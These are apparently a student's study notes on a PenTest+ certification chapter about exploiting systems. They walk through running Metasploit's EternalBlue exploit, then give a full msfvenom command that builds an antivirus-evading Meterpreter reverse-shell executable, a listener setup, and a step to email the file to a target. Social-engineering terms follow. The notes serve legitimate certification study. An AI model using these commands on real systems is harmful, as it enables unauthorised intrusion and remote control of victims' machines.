# CompTIA® PenTest+® Certification For Dummies®, 2nd Edition
# Chapter 5: Exploiting Systems

Common Types of Exploits to gain access to systems
- Server Message Block (SMB), Pass the Hash, Password Cracking, Social Engineering, Man in the Middle (MiTM), Attacks on Physical Security.

## Exploiting System with Metasploit

A list of vuln that can be exploited to gain access to those systems after the vuln scan.
- Metasploit = Most popular exploit tool.


## Metasploit

Kali Linux: `msfconsole`  command.
- type `?` to bring up the help screen

Metasploit Exploit Rankings
- Rank indicates the usual success rate of the exploit.
- Good, Great, or Excellent is a good ranking.

![image](https://github.com/user-attachments/assets/dfdf5bb5-03d9-492f-9d75-5516bf581c35)


Each exploit = separate module in Metasploit.
- `Search` command to search for your exploit; `> search EternalBlue`.
- `Use` command to use the exploit; `> use exploit/windows/smb/ms_17_010_eternalblue`.
- `show options` command to see what options need to be filled. `> show options`.
  - RHOST = remote host

![image](https://github.com/user-attachments/assets/ddecb943-e3bc-4fa7-946f-9f325f832e9d)

- `set` command to set the option name for the required option; `> set RHOST 192.168.67.135`.

![image](https://github.com/user-attachments/assets/05ec6cc9-8253-4ba9-86e6-7c5006b46a9f)

- `exploit` command to run the exploit; `> exploit`.


WIN text after running the exploit = Windows command prompt of the target system, that you have admin capabilities of the target.

![image](https://github.com/user-attachments/assets/2b2bee4c-7cc5-4b83-b84d-d51826304ea5)

You will gain Windows\system32 shell access to the system. `CTRL + C` to exit.

![image](https://github.com/user-attachments/assets/28fe4432-f0bb-474e-99ee-53a84c47964d)

#

## Setting the Payload

Execute the Payload when you gain access to the system by exploiting the vuln.


Types of payload:
- Bind Shell, Reverse Bind Shell, Meterpreter Shell

![image](https://github.com/user-attachments/assets/63da9de5-fee9-4132-9d57-67884d93e976)


Select a payload with `set payload` command.

![image](https://github.com/user-attachments/assets/51f76304-249a-4cc2-8b1a-93576f360bec)

It's a good idea to use `show options` command to see if there are any payload options that needs to be set after changing the payload.

#

## Msfvenom

Msfvenom = payload generator that generate and output shell codes on Metasploit.
- Reverse Shell: enable you to obtain meterpreter session with target.
- Meterpreter session: Can download files from victim's PC, obtain password hashes, use webcam, and run many other post exploitation commands.

## Steps used to exploit system with malicous code generated with Msfvenom

1. Run `ifconfig` and record your own IP address.

2. Obtain meterpreter session using reverse TCP shell:

`msfvenom -p windows/meterpreter/reverse_tcp LHOST=<ip_of_Kali> LPORT=4444 -a x86 --platform win -e x86/shikata_ga_nai -f exe -i 15 > /root/Desktop/ClarkeMalware.exe`

- -p: specifies the payload you wish to use.
- LHOST: specifies the IP address with which to obtain a reverse connection. This will be the IP address of the Kali system that will run a listener waiting for the program to connect.
- LPORT: specifies the port to connect to on the Kali system.
- -a x86: specifies the architecture of x86 for the created code.
- --platform win: specifies the code generated is for a Windows system.
- -e: specifies the encoder to use.
- -f exe: specifies the format of the generated code is to be an .exe file.
- -i 15: specifies to encode the program 15 times as an attempt to hide the malicious code from antivirus software.
-  `>`: specifies the filename to generate.
    

3. Setup a listener on your system by running:

`msfconsole`
`use exploit/multi/handler`
`set payload windows/meterpreter/reverse_tcp`
`set LHOST <ip_of_Kali>`
`exploit`

![image](https://github.com/user-attachments/assets/2b4f303a-240c-405d-b817-bd159c0d3f8d)


4. Copy or email malware to target machine:

When the user runs the program, the user’s system will connect to your Kali Linux system (the pentester system). Once connected, you will have a meterpreter shell to do as you please with the user’s system.

#

## Common Websites to Locate Exploit Against Different Products:

- Exploit-DB exploit database (DB): Source of info on exploits against vulnerable software. `www.exploit-db.com`
- Packet Storm: Listing of exploits against different software. `packetstormsecurity.com`

#

## Social Engineering

Phishing

- Spear phishing: Refers to a phishing attack that targets a specific person.
- SMS phishing: Short message service (SMS) phishing, also known as smishing, is a phishing attack conducted through text messaging instead of email.
- Vishing: Phishing attacks that use voice over the phone instead of email.
- Whaling: Refers to a phishing attack that targets the “big fish” of a company, such as the CEO.

Interrogation: asking people question, number of physical reactions to the question can be used to identify area that should be more questioning.

Watering Hole Attack: When hacker compromises a popular website then places code on site that will execute in browser of anyone who visits the site. The code then compromises the visitor's PC giving hacker access to visitor.


#

## Exam Key

- Social Engineering goal = elicitation (method of communication used to get information from someone without making them aware that they are being targeted), causing victom to compromise security.
- Business Email Compromise (BEC) attack = gain access to employee's corporate email account and use it to send messages to other employees in the company.
